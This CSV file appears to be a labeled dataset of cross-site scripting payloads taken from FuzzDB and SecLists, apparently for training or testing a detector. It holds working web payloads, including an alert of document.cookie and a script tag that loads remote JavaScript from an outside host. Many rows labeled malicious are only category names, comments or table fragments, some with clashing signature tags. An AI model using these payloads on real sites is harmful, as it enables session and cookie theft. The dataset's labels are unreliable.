Payload,Signature,AttackType,Severity,MITRE,Label,Description
JSON based onload vector,XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting payload from FuzzDB
"<div onpointermove=""alert(45)"">MOVE HERE</div>",XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting attack attempt
"onerror CDATA ""alert(67)""",XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting payload from SecLists
Basic JS breaker variant 7,XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting payload from FuzzDB
"<div id=""115""><!--[if]><script>alert(115)</script -->",XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting payload from SecLists
ondatasetcomplete,XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting payload from FuzzDB
Self-contained XSS variant 2,XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting payload from FuzzDB
{{'a'.constructor.prototype.charAt=[].join;$eval('x=1} } };alert(1)//');}},XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting attack attempt
OBJECT w/Embedded XSS,XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting payload from FuzzDB
<img src=x onerror=prompt('XSS')>,XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting attack attempt
onwebkitanimationiteration,XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting payload from FuzzDB
<--`<iMG/srC=` onerror=confirm``> --!>,XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting payload from SecLists
onfocus,XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting payload from FuzzDB
'-alert(1)-',XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting payload from SecLists
onfinish,XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting payload from FuzzDB
confirm('XSS'),XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting attack attempt
"<svg xmlns=""http://www.w3.org/2000/svg"">",XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting payload from SecLists
<!-- Up to Opera 12.x -->,XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting payload from SecLists
<script> var+x+=+showModelessDialog+(this); alert(x.document.cookie); </script>,XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting payload from FuzzDB
<x ondblclick=alert(1)>double click this!,XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting payload from SecLists
'alert(1);',XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting attack attempt
"onload CDATA ""alert(2)"">",XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting payload from SecLists
ondragdrop,XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting payload from FuzzDB
<textarea onfocus=alert('document.domain') autofocus>,XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting attack attempt
"<BODY BACKGROUND=""javascript:alert('XSS')"">",XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting payload from FuzzDB
"<IFRAME SRC=""javascript:alert('XSS');""></IFRAME>",XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting payload from FuzzDB
iframe Chrome bypass,XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting payload from FuzzDB
Exploit Description: HTML entities (the semicolons are required for this to work).,XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting payload from FuzzDB
"*/alert(1)"">'onload=""/*<svg/1='",XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting payload from SecLists
"""onmouseover=alert(1)//",XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting payload from SecLists
"""><script src=//brutelogic.com.br&sol;1.js&num;",XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting payload from SecLists
"<div onkeydown=alert(""XSS"")>",XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting attack attempt
alert(cookieValue.value),XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting attack attempt
Remote IE URL overloading,XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting payload from FuzzDB
onformchange,XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting payload from FuzzDB
Escaping JavaScript escapes,XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting payload from FuzzDB
<img src='1' onerror\x0b=alert(0) />,XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting attack attempt
onloadedmetadata,XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting payload from FuzzDB
"<p onclick=confirm(""XSS"")>",XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting attack attempt
ongesturechange,XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting payload from FuzzDB
"| `\u02BA` (%CA%BA)       | MODIFIER LETTER DOUBLE PRIME | ""     | QUOTATION MARK |",CMDi,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting attack attempt
onloadeddata,XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting payload from FuzzDB
<svgonload=alert(1)>,XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting attack attempt
Cookie Manipulation,XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting payload from FuzzDB
| `ſ` (%c5%bf) | `toUpperCase()` | S |,CMDi,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting attack attempt
al\x65rt\x2814\x29,XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting attack attempt
"<div id=""132""><!doctype html>",XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting payload from SecLists
Author Name: DoctorDan,XSS,Cross-Site Scripting,Medium,T1059.007,Malicious,Cross-Site Scripting payload from FuzzDB
